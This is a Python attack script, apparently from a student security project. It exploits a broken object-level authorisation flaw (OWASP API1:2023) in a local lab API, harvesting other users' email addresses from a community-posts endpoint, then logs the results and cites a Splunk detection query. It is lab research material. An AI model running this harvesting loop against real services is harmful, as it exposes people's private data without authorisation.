#!/usr/bin/env python3
"""
ATTACK 1: BOLA - Broken Object Level Authorisation
OWASP: API1:2023
What: Access other users data by changing IDs in requests
How: Send authenticated requests to community endpoint repeatedly
Why dangerous: API returns other users private data without checking ownership
"""
import requests
import time
import json
import datetime

TARGET = "http://localhost:8888"
RESULTS = "/home/xd-strange24/mscproject/experiments"

def run(token, count=20):
    print("=" * 55)
    print("ATTACK 1: BOLA (API1:2023)")
    print("Broken Object Level Authorisation")
    print("=" * 55)

    endpoint = TARGET + "/community/api/v2/community/posts/recent"
    headers = {"Authorization": "Bearer " + token}

    success = 0
    exposed = []

    print("[*] Target: " + endpoint)
    print("[*] Sending " + str(count) + " requests...\n")

    for i in range(count):
        try:
            r = requests.get(endpoint, headers=headers, timeout=5)
            if r.status_code == 200:
                success += 1
                data = r.json()
                for post in data.get("posts", []):
                    email = post.get("author", {}).get("email", "")
                    if email and email not in exposed:
                        exposed.append(email)
                        print("[!] EXPOSED USER: " + email)
            time.sleep(0.3)
        except Exception as e:
            print("[ERROR] " + str(e))

    print("\n[RESULT] " + str(success) + "/" + str(count) + " requests succeeded")
    print("[RESULT] " + str(len(exposed)) + " user accounts exposed")
    print("[SEVERITY] HIGH")
    print("[SPLUNK] Check: index=api_logs community/posts/recent")

    result = {
        "attack": "BOLA",
        "owasp": "API1:2023",
        "timestamp": datetime.datetime.now().isoformat(),
        "endpoint": endpoint,
        "requests": count,
        "successful": success,
        "exposed_users": exposed,
        "severity": "HIGH"
    }

    ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    path = RESULTS + "/attack1_bola_" + ts + ".json"
    with open(path, "w") as f:
        json.dump(result, f, indent=2)
    print("[SAVED] " + path)
    return result

if __name__ == "__main__":
    token = input("Enter Bearer token: ").strip()
    run(token)
